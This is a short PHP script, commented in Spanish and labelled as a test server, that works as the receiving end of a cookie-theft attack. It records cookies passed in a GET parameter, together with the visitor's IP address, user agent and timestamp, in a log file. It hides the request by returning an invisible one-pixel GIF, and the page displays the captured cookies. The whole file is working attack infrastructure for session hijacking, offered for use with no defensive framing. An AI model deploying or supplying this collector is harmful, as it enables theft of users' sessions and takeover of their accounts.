<?php
// steal.php - Guarda en tu XAMPP/WAMP (htdocs)
$cookie = $_GET['c'] ?? '';

if(!empty($cookie)) {
    $ip = $_SERVER['REMOTE_ADDR'];
    $fecha = date('Y-m-d H:i:s');
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    
    $log = "=== COOKIE ROBADA ===\n";
    $log .= "Fecha: $fecha\n";
    $log .= "IP: $ip\n";
    $log .= "Cookies: $cookie\n";
    $log .= "User-Agent: $user_agent\n";
    $log .= "========================\n\n";
    
    file_put_contents('cookies_robadas.txt', $log, FILE_APPEND);
    
    // Responder con imagen invisible
    header('Content-Type: image/gif');
    echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
    exit;
}
?>
<!DOCTYPE html>
<html>
<body>
    <h2>Servidor de Prueba - Robo de Cookies</h2>
    <p>Esperando cookies...</p>
    <?php
    if(file_exists('cookies_robadas.txt')) {
        echo "<h3>Cookies Capturadas:</h3>";
        echo "<pre>" . htmlspecialchars(file_get_contents('cookies_robadas.txt')) . "</pre>";
    }
    ?>
</body>
</html>